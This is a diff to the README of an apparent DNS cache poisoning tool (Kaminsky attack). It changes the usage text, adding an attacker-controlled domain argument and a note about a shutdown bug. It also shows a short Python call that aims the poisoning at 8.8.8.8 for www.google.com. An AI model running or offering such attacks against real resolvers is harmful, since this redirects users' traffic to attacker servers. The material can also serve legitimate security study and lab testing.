@@ -1,7 +1,9 @@
 # DNS Poisoning Tool
 A tool to perform DNS cache poisoning against vulnerable server.
 
-Attack methodology is widely described here: [Kaminsky Attack](http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html)
+![Tool Screen]("docs/dnspoisoning_screen.png")
+
+Both attack methodology is widely described here: [Kaminsky Attack](http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html)
 
 A detailed software documentation can be found [here](https://gr3yc4t.github.io/dns-poisoning-tool/)
 
@@ -19,10 +21,10 @@ Inline requirements installation command pip install:
 ## Usage
 ```
 usage: main.py [-h] -t DOMAIN -a ATTACKER_IP -v VICTIM_DNS_IP
-               [-bs BAD_SERVER_IP] [-bp BAD_SERVER_PORT] [-ns NS_SERVER]
-               [-i INTERFACE] [-at {NORMAL,DAN}] [-m {NORMAL,FAST}]
-               [-vm VICTIM_MAC] [-si SECRET_IP] [-sp SECRET_PORT] [-nc]
-               [-vb {1,2,3,4}]
+               [-bs BAD_SERVER_IP] [-bp BAD_SERVER_PORT] -bd BAD_DOMAIN
+               [-ns NS_SERVER] [-i INTERFACE] [-at {NORMAL,DAN}]
+               [-m {NORMAL,FAST}] [-vm VICTIM_MAC] [-si SECRET_IP]
+               [-sp SECRET_PORT] [-nc] [-vb {1,2,3,4}]
 
 DNS Poisoning Attack Tool
 
@@ -38,6 +40,8 @@ optional arguments:
                         The Bad Guy DNS server IP
   -bp BAD_SERVER_PORT, --bad-server-port BAD_SERVER_PORT
                         The Bad Guy DNS server port
+  -bd BAD_DOMAIN, --bad-domain BAD_DOMAIN
+                        The domain belonging to the attacker controlled zone
   -ns NS_SERVER, --ns-server NS_SERVER
                         The victim authoritative server
   -i INTERFACE, --interface INTERFACE
@@ -76,3 +80,6 @@ import DNSPoisoning
 poisoning = DNSPoisoning('8.8.8.8', 'www.google.com', '66.66.66.66')
 poisoning.start_flooding()
 ```
+
+### Bugs
+When runninng in faster mode, a single CTRL+C signal is not sufficient to stop the execution due to some thread/signal handler bug. Therefore to completely stop the tool is required to hold CTRL+C for few seconds until the terminate the application.
